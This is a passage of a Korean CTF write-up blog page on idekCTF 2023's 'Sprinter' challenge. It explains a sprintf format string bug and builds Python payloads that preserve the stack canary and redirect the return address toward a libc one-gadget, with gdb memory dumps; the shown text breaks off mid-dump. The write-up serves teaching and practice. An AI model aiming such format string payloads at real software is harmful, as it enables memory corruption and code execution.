@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1839   I’ve always found myself to be more of a distance runner than a sprinter, but sometimes you just have to sprint that final stretch.nc sprinter.chal.idek.team 1337   [">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ideck CTF 2023 - Sprinter (*FSB*)">
+<meta property="og:url" content="https://jiravvit.github.io/230117-idekctf2023-sprinter/index.html">
+<meta property="og:site_name" content="jir4vvit">
+<meta property="og:description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1839   I’ve always found myself to be more of a distance runner than a sprinter, but sometimes you just have to sprint that final stretch.nc sprinter.chal.idek.team 1337   [">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jiravvit.github.io/images/230117-idekctf2023-sprinter/Screenshot%202023-01-17%20at%2020.44.01.png">
+<meta property="og:image" content="https://jiravvit.github.io/images/230117-idekctf2023-sprinter/Screenshot%202023-01-17%20at%2000.29.59.png">
+<meta property="article:published_time" content="2023-01-16T23:00:00.000Z">
+<meta property="article:modified_time" content="2023-01-17T21:36:55.926Z">
+<meta property="article:author" content="jir4vvit">
+<meta property="article:tag" content="fsb">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jiravvit.github.io/images/230117-idekctf2023-sprinter/Screenshot%202023-01-17%20at%2020.44.01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/judi2.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/judi2.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/judi2.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>ideck CTF 2023 - Sprinter (*FSB*)</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/230116-idekctf2023-typop/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/230117-idekctf2023-sprinter/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/230117-idekctf2023-sprinter/&text=ideck CTF 2023 - Sprinter (*FSB*)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/230117-idekctf2023-sprinter/&title=ideck CTF 2023 - Sprinter (*FSB*)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/230117-idekctf2023-sprinter/&is_video=false&description=ideck CTF 2023 - Sprinter (*FSB*)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ideck CTF 2023 - Sprinter (*FSB*)&body=Check out this article: https://jiravvit.github.io/230117-idekctf2023-sprinter/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/230117-idekctf2023-sprinter/&title=ideck CTF 2023 - Sprinter (*FSB*)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/230117-idekctf2023-sprinter/&title=ideck CTF 2023 - Sprinter (*FSB*)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/230117-idekctf2023-sprinter/&title=ideck CTF 2023 - Sprinter (*FSB*)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/230117-idekctf2023-sprinter/&title=ideck CTF 2023 - Sprinter (*FSB*)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/230117-idekctf2023-sprinter/&name=ideck CTF 2023 - Sprinter (*FSB*)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/230117-idekctf2023-sprinter/&t=ideck CTF 2023 - Sprinter (*FSB*)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solve"><span class="toc-number">2.</span> <span class="toc-text">Solve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-c"><span class="toc-number">2.1.</span> <span class="toc-text">0. $[]%[]c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Canary-%EB%B3%B4%EC%A1%B4"><span class="toc-number">2.2.</span> <span class="toc-text">1. Canary 보존</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-ret%EB%A5%BC-%EB%8D%AE%EC%96%B4-%ED%9D%90%EB%A6%84-%EB%B3%80%EA%B2%BD%ED%95%98%EA%B8%B0"><span class="toc-number">2.3.</span> <span class="toc-text">2. ret를 덮어 흐름 변경하기</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-offset-Brute-forcing"><span class="toc-number">2.4.</span> <span class="toc-text">3. offset Brute forcing</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">3.</span> <span class="toc-text">Exploit Code</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ideck CTF 2023 - Sprinter (*FSB*)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">jir4vvit</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-01-16T23:00:00.000Z" itemprop="datePublished">2023-01-17</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WriteUp/">WriteUp</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/fsb/" rel="tag">fsb</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <ul>
+<li><a target="_blank" rel="noopener" href="https://ctftime.org/event/1839">https://ctftime.org/event/1839</a></li>
+</ul>
+<blockquote>
+<p>I’ve always found myself to be more of a distance runner than a sprinter, but sometimes you just have to sprint that final stretch.<br><code>nc sprinter.chal.idek.team 1337</code></p>
+</blockquote>
+<ul>
+<li>[25 solves &#x2F; 489 points]</li>
+</ul>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Canary                        : ✓ (value: 0xfe2ac7e4ac5ec700)</span><br><span class="line">NX                            : ✓ </span><br><span class="line">PIE                           : ✘ </span><br><span class="line">Fortify                       : ✘ </span><br><span class="line">RelRO                         : Partial</span><br></pre></td></tr></table></figure>
+
+<p><code>canary</code>가 존재한다. </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your string into my buffer, located at %p: &quot;</span>, buf);</span><br><span class="line">  fgets(buf, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v0 = (<span class="type">size_t</span>)<span class="built_in">strchr</span>(buf, <span class="string">&#x27;n&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    <span class="keyword">if</span> ( v0 &lt;= <span class="number">0x26</span> )</span><br><span class="line">      LODWORD(v0) = <span class="built_in">sprintf</span>(buf, buf); <span class="comment">// [*]</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>[*]</code> 에서 <code>Format String Bug</code>가 터진다. 안타깝게도 <code>n</code>을 필터링하고, <code>sprintf(buf, buf)</code> 형식으로 버그가 발생하기 때문에 문제 풀기 굉장히 까다롭다. 페이로드를 적어놨는데 포맷스트링을 실행(?)하면서 내가 적어놨던 페이로드가 덮힐 수도 있기 때문이다. </p>
+<p>문제를 보며 가장 먼저 생각이 들었던 것은 <code>n</code>이 필터링 되어 있는데 어떻게 overflow를 일으켜서 어떻게 ret를 변조하느냐였다. 더욱이 canary가 존재했기 때문에 이것을 어떻게 우회하거나 leak할 지도 고민이었다. 하지만 여러가지 테스트를 진행한 결과 <code>%c</code> 등을 이용해서 overflow를 쉽게 일으킬 수 있었고 canary를 미리 구해놓는 과정이 필요하다고 판단했다.</p>
+<p>이 문제가 까다로운 점이 한 가지 더 존재한다. 바로 페이로드의 길이 제한인데, <code>strlen</code>을 이용해서 페이로드의 길이를 구하고 있다. </p>
+<p>이 문제의 환경은 <code>Ubuntu 20.04</code>이며 다행히 작동하는 <code>one gadget</code>이 존재한다. (문제 파일에 libc가 함께 포함되어 있다.)</p>
+<h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://uz56764.tistory.com/83">https://uz56764.tistory.com/83</a></li>
+</ul>
+<p>기간 내에 이 문제를 풀지 못했기 때문에 위 블로그를 참고하여 공부를 진행했다.</p>
+<h3 id="0-c"><a href="#0-c" class="headerlink" title="0. $[]%[]c"></a>0. <code>$[]%[]c</code></h3><p>뻘하게 헷갈렸던 개념이다.. 정확히는 <code>$[offset]%[num]c</code>으로 정의하고 싶다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%100c\n&quot;</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>이것의 출력 결과는 무엇일까? 99번 공백을 출력하고 마지막에 ‘A’를 출력한다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%100s\n&quot;</span>, <span class="string">&quot;AA&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>자매품으로 이것의 출력 결과는 98번 공백을 출력하고 마지막에 ‘AA’를 출력한다.</p>
+<p><code>$[offset]</code>의 의미는.. <code>FSB</code>에서 많이 보던 바로 그거다. offset 번째를 참조한다. 만약 <code>%10$264c</code>라면 먼저 공백 264개를 출력하고 10번째 offset을 참조한 값을 출력할 것이다.</p>
+<h3 id="1-Canary-보존"><a href="#1-Canary-보존" class="headerlink" title="1. Canary 보존"></a>1. Canary 보존</h3><p>제일 먼저 해야할 일은 <code>canary</code>를 보존해야하는 것이다. (어떻게 보면 이 문제의 핵심이라고도 할 수 있겠다.) 그 전에 <code>canary</code> 직전까지 덮어보자.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%10$264c&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line"></span><br><span class="line"><span class="comment"># padding</span></span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">0x26</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x2</span></span><br><span class="line"></span><br><span class="line">payload += p8(<span class="number">0x41</span>)   <span class="comment"># 10</span></span><br></pre></td></tr></table></figure>
+
+<p>한 블록은 8바이트이기 때문에 패딩을 저렇게 줘야한다. 가독성을 위해 두 번 나누어서 작성했는데, 0x26의 의미는 문제에서 요구한 길이 제한이다.</p>
+<p>payload를 저렇게 작성하게 되면 10번째 offset을 참고하여 264번의 공백 출력 후 마지막에 0x41을 출력한다. gdb 상에서 확인해보면 아래와 같다.</p>
+<ul>
+<li><code>FSB</code> 일으키기 전</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x007ffc4a31cb80│+0x0000: &quot;%10$264c&quot;     ← $rdx, $rsp, $rsi, $rdi, $r8</span><br><span class="line">0x007ffc4a31cb88│+0x0008: 0x0000000000000000        # 6</span><br><span class="line">0x007ffc4a31cb90│+0x0010: 0x0000000000000000        # 7</span><br><span class="line">0x007ffc4a31cb98│+0x0018: 0x0000000000000000        # 8</span><br><span class="line">0x007ffc4a31cba0│+0x0020: 0x0000000000000000        # 9</span><br><span class="line">0x007ffc4a31cba8│+0x0028: 0x00034000000a41 (&quot;A\n&quot;?) # 10</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>FSB</code> 일으킨 후</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x7ffc4a31cb80: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cb90: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cba0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbb0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbc0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbd0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbe0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbf0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc00: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc10: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc20: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc30: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc40: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc50: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc60: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc70: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc80: 0x4120202020202020      0x5207f53f7a984d00</span><br><span class="line">0x7ffc4a31cc90: 0x00007ffc4a31cca0      0x00000000004012fd</span><br></pre></td></tr></table></figure>
+
+<p>본격적으로 <code>canary</code> 보존을 시작해보자. <code>ret</code>를 덮기 위해서는 필수적으로 <code>canary</code>를 건드려야만 한다. 우리는 <code>FSB</code>를 이용하여 <code>canary</code>를 구한 다음에 써야 한다. 즉, 앞에서 말한 <code>canary</code> 보존은 <code>canary</code>를 leak한 다음 그 자리에 다시 써야하는 것을 의미한다.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%5$264c&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%4$c&#x27;</span>   <span class="comment"># 0x00</span></span><br><span class="line">payload += <span class="string">b&#x27;%10$.7s&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # padding</span></span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">0x26</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x2</span></span><br><span class="line"></span><br><span class="line">payload += p64(canary_addr + <span class="number">1</span>)     <span class="comment"># 10</span></span><br></pre></td></tr></table></figure>
+
+<p><code>5번째</code> 오프셋은 <code>0x25</code>를 의미하고 <code>4번째</code> 오프셋은 <code>r9</code> 레지스터인 <code>0x00</code>이다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fff9a4022f0: 0x2563343632243525</span><br></pre></td></tr></table></figure>
+
+<p><code>10번째</code> 오프셋은 <code>canary_addr + 1</code>을 의미하는데 <code>+1</code>의 의미는 <code>canary</code>는 <code>null</code> 바이트부터 시작하기 때문이다. 그래서 <code>canary_addr + 1</code>부터 <code>%.7s</code>를 이용하여 7자리만 가져왔다. 앞에서 <code>%4$c</code>으로 <code>null</code> 바이트 한 바이트만 가져왔기 때문에 <code>canary</code>가 잘 보존되었으리라 생각된다. </p>
+<p><code>%s</code>를 이용하여 카나리를 전부 다 가져오게 되면 <code>null</code> 바이트 때문에 <code>sprint</code> 함수로 <code>canary</code> 출력을 하다가 끊긴다. 사실상 첫 바이트가 <code>null</code>이기 때문에 전혀 출력을 하지 못한다. 그래서 위와 같은 방법으로 출력을 해야한다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x7fff9a4022f0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402300: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402310: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402320: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402330: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402340: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402350: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402360: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402370: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402380: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402390: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023a0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023b0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023c0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023d0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023e0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023f0: 0x2520202020202020      0x92c29f2c0e8fb100</span><br><span class="line">0x7fff9a402400: 0x00007fff9a402400      0x00000000004012fd</span><br></pre></td></tr></table></figure>
+
+<p><code>canary</code> 보존에 성공했으면 <code>rbp</code>를 덮고 <code>ret</code>를 원하는 곳으로 돌려주면 끝이다.</p>
+<h3 id="2-ret를-덮어-흐름-변경하기"><a href="#2-ret를-덮어-흐름-변경하기" class="headerlink" title="2. ret를 덮어 흐름 변경하기"></a>2. <code>ret</code>를 덮어 흐름 변경하기</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;AAA%5$261c&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%4$c&#x27;</span>  <span class="comment"># 0x00</span></span><br><span class="line">payload += <span class="string">b&#x27;%10$.7s&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rbp</span></span><br><span class="line">payload += <span class="string">b&#x27;%8c&#x27;</span></span><br><span class="line"><span class="comment"># ret</span></span><br><span class="line">payload += <span class="string">b&#x27;%12$.3s%11$.5s&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># padding</span></span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">0x26</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x2</span></span><br><span class="line"></span><br><span class="line">payload += p64(canary_addr + <span class="number">1</span>)        <span class="comment"># 10 canary</span></span><br><span class="line">payload += p64(canary_addr + <span class="number">8</span>*<span class="number">4</span> + <span class="number">3</span>)  <span class="comment"># 11 libc</span></span><br><span class="line">payload += p64(stack_leak)             <span class="comment"># 12 stack</span></span><br></pre></td></tr></table></figure>
+
+<p><code>sprintf(buf, buf);</code>으로 <code>FSB</code>가 트리거 될 때 익스하는 것에서 가장 까다로운 점은 페이로드를 적어놓은 <code>buf</code>가 포맷스트링에 의해 덮힐 가능성이 존재한다는 것이다. 그래서 우리는 실행하고 싶은 주소를 페이로드 제일 앞에 적어주어 덮히지 않게 해야 한다. </p>
+<p><code>ret</code> 부분의 포맷스트링을 해석해보면 12번째 오프셋에서 3바이트를 가져오고 11번째 오프셋에서 5바이트를 가져오는 것을 의미한다. 12번째 오프셋에는 스택 주소가 적혀져 있으며 페이로드 첫 부분 3바이트를 가져오는 것을 의미한다. 11번째 오프셋은 libc 주소가 저장되어 있는데 정확한 값은 아래와 같다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7f 78 55 18 d0 83</span><br></pre></td></tr></table></figure>
+
+<p><code>aslr</code> 때문에 하위 1.5바이트를 제외하고 계속 변경된다. 우리가 사용할 <code>one gadget</code> offset은 3바이트이므로 5바이트만 정확한 값을 쓰고 나머지 3바이트를 <code>one gadget</code> offset을 사용한다. 물론 이 값은 페이로드 가장 첫 부분에 적혀 있어야 한다. 일단 이 부분은 <code>AAA</code>로 값을 적어놓고 3 글자 썼기 때문에 <code>%264c</code>를 <code>%261c</code>로 변경하였다. </p>
+<p>이제 gdb 상으로 메모리를 살펴보자.</p>
+<ul>
+<li><code>FSB</code> 일으키기 전</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x007ffd1f0d4bb0│+0x0000: &quot;AAA%5$261c%4$c%10$.7s%8c%12$.3s%11$.5s&quot;       ← $rdx, $rsp, $rsi, $rdi, $r8</span><br><span class="line">0x007ffd1f0d4bb8│+0x0008: &quot;1c%4$c%10$.7s%8c%12$.3s%11$.5s&quot;</span><br><span class="line">0x007ffd1f0d4bc0│+0x0010: &quot;0$.7s%8c%12$.3s%11$.5s&quot;</span><br><span class="line">0x007ffd1f0d4bc8│+0x0018: &quot;%12$.3s%11$.5s&quot;</span><br><span class="line">0x007ffd1f0d4bd0│+0x0020: 0x0073352e243131 (&quot;11$.5s&quot;?)</span><br><span class="line">0x007ffd1f0d4bd8│+0x0028: 0x007ffd1f0d4cb9  →  0xd0edc89128c0bcb7</span><br><span class="line">0x007ffd1f0d4be0│+0x0030: 0x007ffd1f0d4cdb  →  0x00001800007f7855</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>FSB</code> 일으킨 후</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0x7ffd1f0d4bb0: 0x2020202020414141      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4bc0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4bd0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4be0: 0x2020202020202020      0x2020202020202020</span><br><span 